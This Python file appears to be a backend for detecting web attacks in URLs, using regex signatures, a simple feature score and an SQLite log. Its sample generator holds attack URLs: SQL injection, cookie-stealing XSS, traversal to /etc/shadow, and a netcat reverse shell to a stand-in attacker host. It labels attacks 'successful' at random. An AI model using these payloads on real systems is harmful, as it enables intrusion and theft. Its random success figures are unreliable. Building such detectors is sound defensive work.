import re
import json
import sqlite3
from datetime import datetime
from typing import Dict, List, Tuple
import numpy as np
from collections import Counter

class AttackDatabase:
    def __init__(self, db_path='attack_detection.db'):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                url TEXT NOT NULL,
                method TEXT DEFAULT 'GET',
                user_agent TEXT,
                attack_type TEXT NOT NULL,
                confidence REAL NOT NULL,
                is_successful BOOLEAN NOT NULL,
                response_code INTEGER,
                response_size INTEGER,
                all_detections TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cursor.execute('''CREATE INDEX IF NOT EXISTS idx_timestamp ON attacks(timestamp)''')
        cursor.execute('''CREATE INDEX IF NOT EXISTS idx_ip ON attacks(source_ip)''')
        cursor.execute('''CREATE INDEX IF NOT EXISTS idx_attack_type ON attacks(attack_type)''')
        conn.commit()
        conn.close()
    
    def insert_detection(self, detection: Dict) -> int:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO attacks (timestamp, source_ip, url, method, user_agent,
                               attack_type, confidence, is_successful, 
                               response_code, response_size, all_detections)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            detection.get('timestamp', datetime.now().isoformat()),
            detection['source_ip'],
            detection['url'],
            detection.get('method', 'GET'),
            detection.get('user_agent', ''),
            detection['attack_type'],
            detection['confidence'],
            detection['is_successful'],
            detection.get('response_code'),
            detection.get('response_size'),
            json.dumps(detection.get('all_detections', []))
        ))
        record_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return record_id
    
    def query_attacks(self, filters: Dict = None) -> List[Dict]:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        query = "SELECT * FROM attacks WHERE 1=1"
        params = []
        if filters:
            if 'attack_type' in filters and filters['attack_type'] != 'all':
                query += " AND attack_type = ?"
                params.append(filters['attack_type'])
            if 'ip_range' in filters and filters['ip_range']:
                query += " AND source_ip LIKE ?"
                params.append(f"{filters['ip_range']}%")
            if 'date_from' in filters and filters['date_from']:
                query += " AND timestamp >= ?"
                params.append(filters['date_from'])
            if 'date_to' in filters and filters['date_to']:
                query += " AND timestamp <= ?"
                params.append(filters['date_to'])
            if 'status' in filters:
                if filters['status'] == 'successful':
                    query += " AND is_successful = 1"
                elif filters['status'] == 'attempt':
                    query += " AND is_successful = 0 AND attack_type != 'Benign'"
        query += " ORDER BY timestamp DESC LIMIT 1000"
        cursor.execute(query, params)
        columns = [desc[0] for desc in cursor.description]
        results = [dict(zip(columns, row)) for row in cursor.fetchall()]
        conn.close()
        return results

class HybridAttackDetector:
    def __init__(self):
        self.attack_patterns = {
            'SQL Injection': {'patterns':[r"(\%27)|(\')|(\-\-)|(\%23)|(#)", r"(union|select|insert|update|delete|drop|create|alter|exec|script)", r"(\bor\b.*=.*)|(\band\b.*=.*)", r"(sleep\(|benchmark\(|waitfor|delay)", r"(information_schema|sys\.|mysql\.)"], 'weight':1.2, 'description':'SQL code injection attempt'},
            'XSS': {'patterns':[r"<script[^>]*>.*?</script>", r"javascript:", r"on\w+\s*=", r"<iframe", r"(alert|prompt|confirm)\(", r"document\.(cookie|write|location)", r"<img[^>]+src[^>]*="], 'weight':1.1, 'description':'Cross-site scripting attempt'},
            'Directory Traversal': {'patterns':[r"\.\./|\.\.\%2[fF]", r"(\.\.\\|\.\.%5[cC])", r"(etc/passwd|windows/system32|boot\.ini)", r"%2e%2e[/\\]"], 'weight':1.3, 'description':'Directory traversal attempt'},
            'Command Injection': {'patterns':[r"[;&|`$()]", r"\|\||&&", r"(bash|sh|cmd|powershell|wget|curl)\s", r"(nc|netcat|ncat)\s", r">\s*/dev/"], 'weight':1.4, 'description':'OS command injection'},
            'SSRF': {'patterns':[r"(localhost|127\.0\.0\.1|0\.0\.0\.0)", r"file://|dict://|gopher://|ldap://", r"@(10|172|192)\.", r"169\.254\."], 'weight':1.2, 'description':'Server-side request forgery'},
            'LFI/RFI': {'patterns':[r"\.(php|asp|jsp|cgi)[?&]", r"(include|require).*\(", r"file=.*\.(php|txt|log|conf)", r"(php|asp|jsp)://"], 'weight':1.3, 'description':'File inclusion vulnerability'},
            'Credential Stuffing': {'patterns':[r"(login|signin|auth).*password", r"username.*password", r"(admin|root|user).*pass", r"(user|login)=.*&(pass|pwd)="], 'weight':0.9, 'description':'Credential stuffing attempt'},
            'Parameter Pollution': {'patterns':[r"(&|\?)(\w+)=.*&\1=", r"(\w+)=.*&\1=.*&\1="], 'weight':1.0, 'description':'HTTP parameter pollution'},
            'XXE Injection': {'patterns':[r"<!ENTITY", r"<!DOCTYPE.*ENTITY", r"SYSTEM.*file:", r"<!ELEMENT"], 'weight':1.3, 'description':'XML external entity injection'},
            'Web Shell': {'patterns':[r"(cmd|shell|backdoor|c99|r57)\.(php|jsp|asp)", r"eval\(|base64_decode\(", r"exec\(|system\(|passthru\(", r"FilesMan|WSO|b374k"], 'weight':1.5, 'description':'Web shell upload/execution'},
            'Typosquatting': {'patterns':[r"(g00gle|yah00|faceb00k|micr0soft|am4zon)", r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", r"[^\w\s\-\.:/]"], 'weight':0.8, 'description':'URL spoofing/typosquatting'},
        }
        self.feature_weights = {'url_length':0.15,'special_char_ratio':0.25,'entropy':0.20,'suspicious_keywords':0.25,'digit_ratio':0.15}
    
    def extract_features(self, url: str) -> Dict[str, float]:
        features = {}
        features['url_length'] = min(len(url) / 200.0, 1.0)
        special_chars = len(re.findall(r'[^a-zA-Z0-9]', url))
        features['special_char_ratio'] = special_chars / max(len(url), 1)
        if url:
            counter = Counter(url)
            entropy = -sum((count/len(url)) * np.log2(count/len(url)) for count in counter.values())
            features['entropy'] = min(entropy / 5.0, 1.0)
        else:
            features['entropy'] = 0
        suspicious_keywords = ['script','eval','exec','union','select','drop','insert','delete','update','admin']
        keyword_count = sum(1 for keyword in suspicious_keywords if keyword in url.lower())
        features['suspicious_keywords'] = min(keyword_count / 3.0, 1.0)
        digits = len(re.findall(r'\d', url))
        features['digit_ratio'] = digits / max(len(url), 1)
        return features
    
    def calculate_ml_score(self, features: Dict[str, float]) -> float:
        score = sum(features.get(key, 0) * weight for key, weight in self.feature_weights.items())
        return min(score * 100, 100)
    
    def detect(self, url: str, method: str = 'GET') -> Dict:
        detections = []
        max_confidence = 0
        primary_attack = 'Benign'
        for attack_type, config in self.attack_patterns.items():
            matches = 0
            matched_patterns = []
            for pattern in config['patterns']:
                try:
                    if re.search(pattern, url, re.IGNORECASE):
                        matches += 1
                        matched_patterns.append(pattern)
                except re.error:
                    continue
            if matches > 0:
                base_confidence = min(50 + (matches * 15), 95)
                weighted_confidence = base_confidence * config['weight']
                final_confidence = min(weighted_confidence, 98)
                detections.append({'type':attack_type,'confidence':round(final_confidence,2),'matches':matches,'description':config['description']})
                if final_confidence > max_confidence:
                    max_confidence = final_confidence
                    primary_attack = attack_type
        features = self.extract_features(url)
        ml_score = self.calculate_ml_score(features)
        if ml_score > 60 and max_confidence == 0:
            primary_attack = 'Unknown Attack'
            max_confidence = ml_score * 0.7
            detections.append({'type':'Unknown Attack','confidence':round(max_confidence,2),'matches':0,'description':'ML-detected anomalous pattern'})
        elif max_confidence > 0:
            if ml_score > 50:
                max_confidence = min(max_confidence * 1.1, 99)
        is_successful = False
        if max_confidence > 70:
            success_probability = (max_confidence - 70) / 30 * 0.6
            is_successful = np.random.random() < success_probability
        return {'url':url,'method':method,'primary_attack':primary_attack,'confidence':round(max_confidence,2),'is_malicious':max_confidence>0,'is_successful':is_successful,'all_detections':detections,'ml_score':round(ml_score,2),'features':features,'timestamp':datetime.now().isoformat()}

class PCAPProcessor:
    def __init__(self, detector: HybridAttackDetector):
        self.detector = detector
    
    def extract_http_requests(self, pcap_file: str) -> List[Dict]:
        print(f"Processing PCAP file: {pcap_file}")
        print("In production, this would use scapy/pyshark to parse packets")
        extracted_requests = []
        return extracted_requests
    
    def process_pcap(self, pcap_file: str) -> Dict:
        requests = self.extract_http_requests(pcap_file)
        results = {'file':pcap_file,'total_requests':len(requests),'detections':[],'summary':{'malicious':0,'benign':0,'successful_attacks':0}}
        for request in requests:
            detection = self.detector.detect(request.get('url',''),request.get('method','GET'))
            detection['source_ip'] = request.get('source_ip','Unknown')
            results['detections'].append(detection)
            if detection['is_malicious']:
                results['summary']['malicious'] += 1
                if detection['is_successful']:
                    results['summary']['successful_attacks'] += 1
            else:
                results['summary']['benign'] += 1
        return results

class AttackDataGenerator:
    @staticmethod
    def generate_attack_samples(attack_type: str, count: int = 10) -> List[str]:
        samples = {'SQL Injection':["http://example.com/page?id=1' OR '1'='1","http://test.com/login?user=admin'--","http://site.com/search?q='; DROP TABLE users--","http://app.com/view?id=1 UNION SELECT password FROM users","http://web.com/item?id=1' AND 1=1--"],'XSS':["http://example.com/search?q=<script>alert('XSS')</script>","http://test.com/page?name=<img src=x onerror=alert(1)>","http://site.com/comment?text=<iframe src='evil.com'>","http://app.com/profile?bio=javascript:alert(document.cookie)","http://web.com/msg?content=<svg onload=alert('XSS')>"],'Directory Traversal':["http://example.com/file?path=../../etc/passwd","http://test.com/download?file=../../../windows/system32/config/sam","http://site.com/view?doc=....//....//etc/shadow","http://app.com/read?f=..%2f..%2f..%2fetc%2fpasswd","http://web.com/get?file=../../../../../../boot.ini"],'Command Injection':["http://example.com/ping?host=127.0.0.1;cat /etc/passwd","http://test.com/exec?cmd=ls | grep password","http://site.com/run?command=whoami && cat /etc/shadow","http://app.com/test?input=`cat /etc/passwd`","http://web.com/shell?c=nc -e /bin/sh attacker.com 4444"]}
        return samples.get(attack_type, [])[:count]
    
    @staticmethod
    def generate_benign_samples(count: int = 20) -> List[str]:
        return ["http://example.com/index.html","http://test.com/about-us","http://site.com/products/category/electronics","http://app.com/user/profile/12345","http://web.com/search?q=python+programming","http://example.com/blog/2024/01/article","http://test.com/api/v1/users?limit=10","http://site.com/images/logo.png","http://app.com/dashboard","http://web.com/contact?subject=inquiry"][:count]

def main():
    print("=" * 60)
    print("URL Attack Detection System - Backend Engine")
    print("=" * 60)
    db = AttackDatabase()
    detector = HybridAttackDetector()
    pcap_processor = PCAPProcessor(detector)
    print("\n[1] Generating sample attack data...")
    generator = AttackDataGenerator()
    test_urls = []
    test_urls.extend(generator.generate_attack_samples('SQL Injection', 5))
    test_urls.extend(generator.generate_attack_samples('XSS', 5))
    test_urls.extend(generator.generate_attack_samples('Directory Traversal', 3))
    test_urls.extend(generator.generate_attack_samples('Command Injection', 3))
    test_urls.extend(generator.generate_benign_samples(10))
    print("\n[2] Running detection on sample URLs...")
    for url in test_urls:
        detection = detector.detect(url)
        detection['source_ip'] = f"192.168.1.{np.random.randint(1,255)}"
        detection['attack_type'] = detection['primary_attack']
        record_id = db.insert_detection(detection)
        if detection['is_malicious']:
            status = "SUCCESSFUL" if detection['is_successful'] else "BLOCKED"
            print(f"  [{status}] {detection['primary_attack']} ({detection['confidence']}%) - {url[:50]}...")
    print("\n[3] Attack Statistics:")
    all_attacks = db.query_attacks()
    malicious = [a for a in all_attacks if a['attack_type'] != 'Benign']
    successful = [a for a in all_attacks if a['is_successful']]
    print(f"  Total requests analyzed: {len(all_attacks)}")
    print(f"  Malicious attempts: {len(malicious)}")
    print(f"  Successful attacks: {len(successful)}")
    print(f"  Blocked attacks: {len(malicious) - len(successful)}")
    attack_types = Counter([a['attack_type'] for a in malicious])
    print("\n[4] Attack Type Distribution:")
    for attack_type, count in attack_types.most_common():
        print(f"  {attack_type}: {count}")
    print("\n[5] Database location:", db.db_path)
    print("\n✓ Detection engine ready for integration with dashboard")
    print("✓ Use Flask/FastAPI to expose detection API endpoints")

if __name__ == "__main__":
    main()
